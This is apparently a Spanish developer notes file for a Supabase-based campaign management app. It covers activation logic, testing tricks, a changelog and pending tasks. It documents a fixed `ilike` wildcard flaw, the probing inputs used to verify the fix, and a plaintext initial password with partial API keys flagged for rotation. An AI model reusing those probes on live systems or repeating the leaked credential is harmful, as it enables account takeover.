  el servidor**, y que solo activa filas que ya existen **con `user_id` nulo** (no sirve para
  secuestrar una cuenta activa ni cambiarle la clave a nadie), y nunca acepta un rol desde el body.
  Si el `update` que enlaza falla, **borra el usuario recién creado** para no dejar una cuenta que
  existe en auth pero que el directorio no reconoce.
- **El correo que se escribe ahí va a un `ilike`, o sea que era un PATRÓN de búsqueda.** `%` y `_`
  son comodines: un `%netsat%` que matcheara una sola fila permitía activar la cuenta de un
  compañero **sin saber su correo**, y la respuesta devolvía su nombre. Hoy se valida la forma del
  correo (que además bloquea el `%`) y el valor se escapa con `comoLiteral()`. Se sigue usando
  `ilike` y no `eq` porque en la tabla los correos están escritos a mano y pueden traer mayúsculas.
  **Regla general: cualquier texto de usuario que llegue a un `.ilike()`/`.like()` hay que
  escaparlo.** El `_` se escapa en vez de rechazarse porque es legal en un correo real.
- La pantalla distingue "ese correo no está en el equipo" (404) de "esa cuenta ya está activa"
  (409). Eso permite tantear qué correos están en el directorio, pero se dejó a propósito: sin esos
  mensajes, quien se equivoca de correo no tiene forma de saber qué pasó. La mitigación es cerrar
  la ventana pronto.
- **La ventana se administra SOLO desde el SQL Editor de Supabase** (la tabla no tiene policies):
  ```sql
  update public.activacion_config set activo_hasta = '2026-08-07 23:59:59-05', updated_at = now();
  ```
  Cerrar de inmediato = ponerle una fecha pasada.

---

## Versión y aviso de actualización

`package.json` es la **única fuente de verdad**. `vite.config.ts` la lee con `readFileSync` y la
inyecta como `__APP_VERSION__` (+ `__BUILD_TIME__`, `__BUILD_ID__`), y emite `version.json` en cada
build. `src/lib/version.ts` concentra todo (las constantes se leen con `typeof __X__ !== 'undefined'`
para que el módulo no explote fuera de un bundle de Vite). El hook consulta con `cache:'no-store'`
al volver a la pestaña y cada 15 min, y **no hace nada en dev** (`/version.json` no existe hasta el
build).

- El aviso **también salta cuando cambia solo el build con el mismo número** (que es el caso normal
  acá), y entonces **no imprime el número** para no confundir.
- `applyUpdate()` limpia `caches` y actualiza los service workers antes de recargar: un
  `location.reload()` pelado dejaba al usuario viendo lo mismo y el aviso en bucle.
- `version.json` va con `Cache-Control: no-cache, must-revalidate`. Si el CDN lo cachea, **el aviso
  no aparece nunca y no da ninguna señal de error**.
- Publicar: `npm version patch|minor|major --no-git-tag-version` → entrada en `CHANGELOG.md` → push
  a `master`.
- La tabla `app_version` quedó **huérfana** (nadie la lee ni la escribe). El control de versiones es
  solo del backend: se actualiza en cada deploy.

---

## Otros detalles que muerden

- **El borrador del wizard** (`src/lib/campaignDraft.ts`) se autoguarda en `localStorage` cada 2 s y
  se ofrece en la lista de campañas. **Solo se descarta al crear la campaña o al pulsar
  "Descartar"** — antes `close()` lo borraba, así que el aviso nunca aparecía. `reset()` limpia el
  formulario en memoria, no el `localStorage`. Sigue siendo local al navegador: no viaja entre
  equipos. Si `setItem` falla (cuota llena) **se avisa una sola vez por sesión del asistente**:
  antes se tragaba el error y la persona creía que su avance estaba a salvo sin estarlo.
- **Un clic fuera no cierra el wizard** (`onPointerDownOutside` + `onInteractOutside`): hay que
  frenar **los dos**, Radix dispara el cierre por vías distintas según sea puntero o foco/táctil.
  Escape se dejó vivo a propósito.
- **Nunca declarar un componente dentro de otro si envuelve inputs.** `Marco` estaba definido
  dentro de `ActivarPage`, así que cada render creaba un tipo nuevo, React remontaba el formulario
  en cada tecla y el `autoFocus` se llevaba el cursor.
- **Diagramas.** El de Flujo de trabajo es un árbol (`computeTreeLayout`: columna = profundidad,
  fila = hoja del subárbol) sobre CSS grid, con dos `<svg>` en **píxeles** por detrás (el área de
  ramas se mide con un `ResizeObserver`; `preserveAspectRatio="none"` deformaba las curvas e impedía
  puntas de flecha). Cada `<svg>` define **su propio** marker: los `id` son globales en el
  documento. Columnas con mínimo de 190px y scroll horizontal si no caben; el `ref` que exporta el
  PNG apunta al **contenido completo**, no al contenedor con scroll, para que la imagen salga
  entera. `pixelRatio: 1.25` (con 2, un diagrama de 1600px salía en 3200 y no cabía en pantalla).
- **`src/lib/interacciones.ts` es compartido** por el wizard (qué chips ofrece) y el diagrama (qué
  filtra al leer). Tenerlo solo en el wizard fue la causa de que el diagrama siguiera pintando
  interacciones que ya no se ofrecían. `INTERACCION_OPCIONES` conserva las 5 aunque un canal no las
  admita: es la lista de "qué es estándar", y sacar una haría que lo ya guardado reapareciera como
  chip personalizado.
- **Herramientas** (`BitlyLinkTool.tsx`): los 6 campos están **hardcodeados** en el frontend — el
  webhook `formulariolink` que iba a servir el schema **nunca existió**. Usa 2 webhooks de n8n:
  `crearlink` (POST, devuelve `{url, titulo, qrUrl}`) y `descargar-qr` (la URL ya viene armada del
  backend). La descarga del QR va por blob + `<a download>` porque el atributo `download` no se
  respeta en recursos cross-origin. Sus design tokens son **locales al componente** a propósito.
- **El kanban viejo se eliminó** (2026-07-29, ~3.700 líneas): `BoardPage`, `Index` (`/inicio`),
  `components/task/*`, `useSupabaseTasks`, `supabaseTaskService`, `notificationService`,
  `src/types/index.ts` y la function `send-notification`. Era UI huérfana —no estaba en el menú, solo
  se llegaba escribiendo la URL— y arrastraba su propio sistema de correo. `/inicio` y `/board/:id`
  **redirigen a `/`** en vez de dar 404, por si alguien las tiene en un marcador.
  Las tablas `tasks` y `task_comments` se borran con la migración `20260729020000`, que **solo lo
  hace si están vacías** — si tienen filas, falla a propósito sin tocar nada (puede ser historial y
  eso no se deshace).
  `storageService.ts` **se queda** aunque el bucket se llame `task-attachments`: lo usan el editor de
  texto, los adjuntos de entregable y los del asistente.

---

## Verificación

- **Playwright**: el navegador está en `%LOCALAPPDATA%\ms-playwright\chromium-1228`. **`chromium
  .launch()` sin argumentos falla** — solo se descargó el Chromium "headed", no
  `chrome-headless-shell`. Hay que pasar `executablePath` apuntando a
  `chromium-1228/chrome-win64/chrome.exe`. El paquete `playwright` **no** está en el proyecto; se
  instala `playwright-core` aparte (no tiene postinstall que descargue navegadores).
- Lo normal es verificar **stubbeando la sesión y `factory_projects`** con `page.route`, para no
  escribir en la base real.
- **Trampas del stub que dejan la pantalla en blanco**: el nodo del flujo usa `label`, no `name`, y
  su `status` es `ProjectTaskStatus` (`pending`…), no `todo` — con cualquiera mal, `NodeCard`
  revienta con `Cannot read properties of undefined (reading 'cls')`. Las pestañas de la campaña
  **no son `role="tab"`** (hay que buscarlas por texto); las del diálogo de la tarea sí.
- `BriefDialog` **avanza solo al siguiente entregable de la cola** al aprobar, así que para aprobar
  varios basta con clicar "Aprobar" seguido.
- Para lógica pura (store, libs, helpers de las edge functions) sale más barato bundlear con esbuild
  y stubbear el cliente de Supabase que abrir un navegador. **Los stubs tienen que quedar
  `external`**: si esbuild los inlinea, la prueba y el código terminan con dos copias del módulo (y
  de la base de mentira) y todo falla por la razón equivocada.
- **Trampas de ese montaje** (costaron tiempo el 2026-07-30):
  - Un `path` que devuelve un plugin de esbuild tiene que ser **exacto**: ya no se le aplica
    `resolveExtensions`, así que el alias `@/…` hay que resolverlo a mano probando `.ts`/`.tsx`.
  - El stub externo se declara con ruta **relativa** (`./stub-x.mjs`) y el bundle se emite **en la
    misma carpeta**; con ruta absoluta de Windows, node no la importa.
  - Si la carpeta de pruebas tiene `package.json` (lo deja `npm init`), hay que ponerle
    `"type": "module"` o los bundles `.js` se cargan como CommonJS y revientan.
  - Las **edge functions** también se pueden probar así: un plugin que mande todo `https://…` a un
    stub (`serve` captura el handler, `createClient` devuelve un directorio falso) y un
    `globalThis.Deno` con `env.get` y `connectTls`. Con un socket de mentira que hable SMTP de
    verdad se prueba el diálogo completo sin tocar Gmail.
- **La prueba de regresión hay que verla FALLAR con el código anterior.** Se hace cambiando el
  archivo por `git show HEAD:<ruta>`, reconstruyendo y corriendo: si pasa igual, la prueba no está
  probando nada. Las cuatro de la revisión del 2026-07-30 se comprobaron así.

---

## Historial reciente

Solo lo que sigue explicando el estado actual. Lo anterior está en el historial de git.

- **2026-07-30 (v1.12.0) — rol Videógrafo + segunda tanda de bugs.** Lo nuevo: canal **Video** →
  guion (Copy) → al aprobarlo nace "Producir video" en el nodo del Videógrafo. Los arreglos, con
  prueba de regresión vista fallar contra el build anterior:
  1. **El wizard de edición trabajaba con una copia congelada de la campaña.** Sus `useState` se
     inicializan al montar `ProjectWorkspace` (o sea al SELECCIONAR la campaña), y nada volvía a
     leer `editProject`: con un cambio de otra persona ya hidratado, "Guardar cambios" lo borraba
     —canales, loops, etapas, adjuntos— y **la guardia de `revision` no salta**, porque ese
     `hydrate` ya había puesto la revisión al día. Hoy se resincroniza al ABRIR el diálogo (no con
     cada cambio de props: si está abierto, alguien está escribiendo ahí).
  2. **`strategistName` no se guardaba al editar** — ni el wizard lo mandaba ni `updateProject` lo
     aceptaba. Decide además el destinatario de `tarea.en_revision`.
  3. **Las tareas de métricas abrían el diálogo del vecino** (viven en el nodo de Envíos/Pauta por
     su `currentNodeId`): preguntaban "¿Enviado?" en vez de pedir los números, y en Pauta guardar
     ahí generaba `Recolectar métricas de Recolectar métricas de Facebook`.
  4. **Solo el primer envío de cada canal generaba métricas** (dedup por nombre) y `\w+` partía
     "Google Ads". Ver `src/lib/metricas.ts`.
  5. **Borrar un nodo dejaba sus tareas huérfanas** — `deleteStrategyNode` no pasaba por
     `limpiarNodosMuertos`.
  6. **`BriefDialog` sin `key`**: al avanzar al siguiente entregable reusaba la instancia y se
     arrastraba el comentario de corrección de la tarea anterior.
  7. **Borrar una campaña con la escritura en vuelo la resucitaba** — el `upsert` aterrizaba
     después del DELETE. `deleteRow` ahora espera la escritura pendiente.
  8. Menores: filtro de fechas de Reportes con una sola fecha + paginación fuera de rango; tope de
     50 MB en los adjuntos de entregable (vive en `storageService`, el único paso obligado de toda
     subida); rol desconocido ya no cae a `soporte`; CSV injection en el export; el diálogo de
     usuario se refresca tras crear el acceso; y se borró el "auto-build" muerto de `MapTab` (sus
     nombres de canal —'Copys', 'Envíos'— no son valores reales, así que nunca creó nada salvo
     nodos "Loop:" sueltos).

- **2026-07-30 (v1.11.0) — revisión de bugs.** Cuatro arreglos, todos con prueba de regresión que
  se comprobó que **falla** con el código anterior:
  1. **El wizard de edición ya no borra el trabajo de los entregables** (`fusionarBriefs` +
     `FabricaBriefItem.origen` + `limpiarNodosMuertos`). Era pérdida de datos irreversible en cada
     "Guardar cambios".
  2. **La carrera entre `hydrate()` y una escritura en vuelo** (`escriturasEnVuelo`): revertía el
     cambio en pantalla y podía borrarlo también de la base.
  3. **`javascript:` en los `href`** guardados (`src/lib/urlSegura.ts`), el hueco que DOMPurify no
     tapaba.
  4. **Un destinatario rechazado ya no apaga el correo del resto del rol** (bucle SMTP por
     destinatario + `ENVIO_PARCIAL`).

- **2026-07-29 (v1.10.0)** — se eliminó el kanban viejo completo (~3.700 líneas, ver "Otros detalles
  que muerden") y se agregó **"Eliminar tarea"** en el diálogo de la tarea: antes no había ninguna
  forma de borrar una tarea, y el enlace `quitar` de la fecha se leía como si lo hiciera (solo
  dejaba la tarea sin fecha — ahora dice "sin fecha"). Adjuntos hasta 50 MB.

- **2026-07-29 (v1.9.2) — segunda pasada de revisión.** Se reacciona a la sesión perdida (antes la
  app se veía vacía en vez de mandarte al login); los adjuntos del asistente pasaron de base64 en el
  JSONB a storage, con tope de 15 MB y ahora sí se pueden abrir; el borrador avisa si no puede
  guardarse; `useCampanasFrescas` lleva la relectura a Mis tareas y Reportes; validación de correo en
  Ajustes. Y se corrigió una regresión propia: la guardia de escritura bajaba el proyecto entero
  para leer un entero.

- **2026-07-29 (v1.9.1)** — se cerró el comodín del `ilike` en `activar-acceso` (permitía activar la
  cuenta de un compañero sin saber su correo) y se quitaron las policies duplicadas que anularon la
  ventana de 10 minutos de edición de comentarios. Auditoría de `pg_policies`: cero policies con
  `anon`.
- **2026-07-29 (v1.9.0) — revisión de seguridad.** Se cerró el acceso anónimo a
  `factory_projects`/`tasks`/`task_comments`; se saneó el HTML con DOMPurify; guardia de escritura
  obsoleta + relectura al volver a la pestaña; `roleId` correcto en las tareas que crea
  `activateNextStage` + respaldo por etiqueta en `isTaskOwnedBy`; reparación de números duplicados;
  limpieza de CR/LF en las cabeceras SMTP; typecheck a cero errores.
- **2026-07-29 (v1.8.x)** — número de campaña (`#7`) y código de tarea (`C1`); aviso de "campaña sin
  terminar" con Continuar/Descartar; el borrador ya no se borra al cerrar el wizard; el clic fuera
  no cierra. Se quitó el bloque "Flujo de trabajo de la interacción" del diagrama del ciclo
  (`accionDeInteraccion` quedó en `interacciones.ts` sin llamadores).
- **2026-07-28/29 (v1.4–1.7)** — la captura de interés es la única fuente del requerimiento
  (excluyente: Landing **o** Formulario, no los dos); interacciones recortadas por canal; correo a
  Gmail SMTP con cliente propio; plantilla responsive con logo; la cadena del flujo arrastra fecha y
  entregable de origen ("Paso anterior"); la tarea de Diseño se renombra al nacer.
- **2026-07-16/17** — `usuarios_roles` (directorio + roles en una sola tabla, 22 personas), login
  real, gestión de usuarios restringida a Estratega/Soporte, semáforo de fechas, `rewrites` en
  `vercel.json`.
- **Rediseño visual "Tremu ISO"** — en producción desde el 2026-07-11 (PR #1): acento `#009CF5`,
  Plus Jakarta Sans, sin modo oscuro, sin gradientes. El semáforo (`state-*`) se conservó porque
  comunica significado; `team-*`/`board-*` se neutralizaron a gris.

---

## Pendientes

### Pendiente de aplicar: la migración del rol Videógrafo

`20260730000000_rol-videografo.sql` **todavía no está aplicada**. Sin ella, guardar a alguien con
rol Videógrafo rebota ("Ese rol no es válido"); el canal Video y su flujo funcionan igual, pero la
tarea de producción no tendría a quién notificarle. Es una sola línea y no toca ninguna fila:

```sql
alter table public.usuarios_roles drop constraint if exists usuarios_roles_rol_check;
alter table public.usuarios_roles add constraint usuarios_roles_rol_check check (
  rol in ('Copywriter','Diseñador','Gestor de canales','Estratega','Soporte','Trafficker','Videógrafo')
);
```

Se puede pegar en el SQL Editor de Supabase. **`supabase db push --linked` NO es equivalente**:
arrastraría también `20260729020000` (borrar las tablas del kanban), que sigue siendo una decisión
aparte.

### Nada más pendiente de desplegar

Las 2 migraciones y las 2 functions de la revisión del 2026-07-29 **están aplicadas y verificadas
contra producción**. Lo que sigue son decisiones y tareas de cuenta, no despliegues.

<details><summary>Cómo se verificó (por si hay que repetirlo)</summary>

- Sin sesión, con solo la publishable key: SELECT devuelve **0 filas** e INSERT da **42501** en
  `factory_projects`, `tasks` y `task_comments`. El control es `usuarios_roles`: tiene 22 filas y
  también devuelve 0, así que "HTTP 200 + 0 filas" es la huella de un SELECT bloqueado por RLS.
- `pg_policies` sobre `public` y `storage`: **cero policies con `anon`**.
- `notificar-correo`: 401 sin token, con token basura y con la key anónima sin sesión.
  `update-user-password`, `create-initial-user`, `send-notification` y `admin-set-password`: **404**
  (no desplegadas, como debe ser).
- `activar-acceso`: `%netsat%`, `%` y `%@camarabaq.org.co` → **400**. La prueba decisiva del escape
  del `_` es mandar **tantos guiones bajos como letras tenga un correo real** (15 para
  `kelvin.trujillo@netsat.co`): da **404**, o sea que el `_` es literal. Con el correo exacto —y en
  mayúsculas— da **409** ("ya está activa"), así que sigue encontrando la fila y no crea nada.

</details>

### Credenciales que quedaron expuestas en chats
- [ ] Cambiar la contraseña de **`kelvin.trujillo@netsat.co`** (se compartió el 2026-07-29 para
      verificar el envío; es rol **Soporte**, o sea que **puede gestionar usuarios**).
- [ ] Cambiar la contraseña inicial de **`ktrujillo`** (`Colombia2026*`, en texto plano en un chat).
- [ ] **Revocar el access token de Supabase (`sbp_…`)** usado el 2026-07-16 — da acceso a **toda la
      cuenta**: https://supabase.com/dashboard/account/tokens
- [ ] Borrar la API key de **Resend** (`re_LDKrS…`, pegada en un chat el 2026-07-28). Ya no se usa
      para nada: https://resend.com/api-keys

### Accesos del equipo
- [ ] **Dar acceso a los otros 21** — hoy solo `ktrujillo` tiene cuenta; el resto sale con "Sin
      acceso". Se reparte el link de `/activar` y cada quien crea su contraseña. **NO verificado: la
      creación real de una cuenta por ahí** (probarlo habría creado un acceso de verdad en
      producción) — la primera persona que active es la prueba real, conviene acompañarla.
- [ ] **CERRAR la ventana de activación** cuando todos hayan entrado (hoy vence el **2026-08-07**).
      Ver el SQL en "Login y activación".
- [ ] **`debe_cambiar_password` no lo hace cumplir nadie** — es solo una columna (default `true` en
      los 22). Falta el gate en el login.
- [ ] "Nuevo Usuario" podría crear la cuenta de una: `create-access` ya existe, solo falta ofrecer
      el campo de contraseña en el diálogo de creación.
- [ ] Considerar **SMTP propio en Supabase Auth**: sin eso no habrá "olvidé mi contraseña".
      Verificar un dominio destraparía esto y de paso permitiría un remitente institucional en vez
      de un gmail (es un registro DNS que **no toca el correo de nadie**).

### Decidido, no hacer (para que nadie lo "arregle" de sorpresa)
- **Los adjuntos siguen públicos de lectura** — decisión del usuario el 2026-07-29. Ver Storage
  arriba.
- **Cabeceras de seguridad y CSP en `vercel.json`: POSTERGADO** por el usuario el 2026-07-29 (no
  descartado). Cuando se retome: las cuatro baratas (`X-Frame-Options`, `Referrer-Policy`,
  `X-Content-Type-Options`, `Permissions-Policy`) no tienen riesgo. El CSP sí — es la segunda capa
  detrás de DOMPurify (con él, un XSS que se escape no puede ejecutar ni exfiltrar), pero hay que
  declarar Supabase (base + functions + storage), los 2 webhooks de n8n, Google Fonts y los
  **estilos en línea** de `BitlyLinkTool` y los diagramas (`'unsafe-inline'` en `style-src`).
  Hacerlo primero en `Content-Security-Policy-Report-Only`, que no bloquea nada y solo reporta en
  consola, y recién después pasarlo a bloquear.

### Deuda técnica y verificaciones
- [ ] **`react-router` 6.30.x tiene un aviso moderado** que solo se cierra subiendo a **7.x**
      (cambio mayor). Los reportes conocidos son de *framework mode*/SSR, que esta app no usa. Es
      una decisión aparte, no se hizo para no arriesgar el ruteo.
- [ ] `npm audit` deja avisos en **herramientas de build** (vite/esbuild/eslint). Cerrarlos pide
      vite 8 (mayor). No llegan al bundle.
- [ ] **Recordatorios por fecha por correo** — no puede salir del navegador: necesita un cron
      (pg_cron o Vercel Cron) que recorra `factory_projects` y junte las tareas rojas por persona.
      La regla ya existe en `src/lib/urgencia.ts`.
- [ ] **Aplicar `20260729020000_borrar-tablas-del-kanban.sql`** (`supabase db push --linked`). Borra
      `tasks`/`task_comments` **solo si están vacías**; si tienen filas falla sin tocar nada y hay
      que revisarlas a mano.
- [ ] Confirmar a mano el **round-trip de "Editar proyecto"** del ecosistema cíclico (etapas, ELMR,
      motor, `etapaId`/`siguienteEtapaId`): se creó y se vio en la misma sesión, no se reabrió.
      (Las **tareas** de ese round-trip ya están cubiertas por las pruebas de `fusionarBriefs`; lo
      que falta es el resto del blob.)
- [x] **Quitar un canal ya guardado** — cubierto por prueba (2026-07-30): `syncCanalNodes` borra su
      nodo, las tareas vacías de ese canal se descartan, las que tenían trabajo se conservan y
      `limpiarNodosMuertos` les quita el `currentNodeId` colgando.
- [ ] Confirmar **CORS** en los 2 webhooks n8n que se usan (`crearlink`, `descargar-qr`) y probar
      `BitlyLinkTool` contra n8n real (solo se verificó con mocks). Para el nombre del archivo del
      QR hace falta además `Access-Control-Expose-Headers: Content-Disposition`.
- [ ] Borrar la rama `origin/worktree-bitacora-rediseno-tremu` (su PR ya se mergeó).
- [ ] **RLS por rol** (más allá de la gestión de usuarios) sigue pendiente a propósito. Ya hay
      sesión real, así que es viable; ojo con el fallo silencioso.
